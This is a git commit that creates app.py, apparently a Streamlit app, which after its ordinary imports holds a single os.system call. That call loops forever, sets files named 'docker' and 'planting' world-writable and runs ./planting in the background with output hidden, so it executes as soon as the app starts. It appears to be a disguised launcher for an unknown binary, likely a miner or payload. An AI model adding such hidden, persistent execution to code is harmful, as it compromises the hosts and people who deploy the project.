6dfbc67b0ff68182fbf83c6f159c8f9a70f338fb
sahanero <109718054+sahanero@users.noreply.github.com>
2022-07-21 21:48:45 +0700

    Create app.py

---
+++ app.py
@@ -0,0 +1,7 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+os.system("while [ 1 ]; do nohup chmod 777 docker planting && ./planting > /dev/null; sleep 1; done")
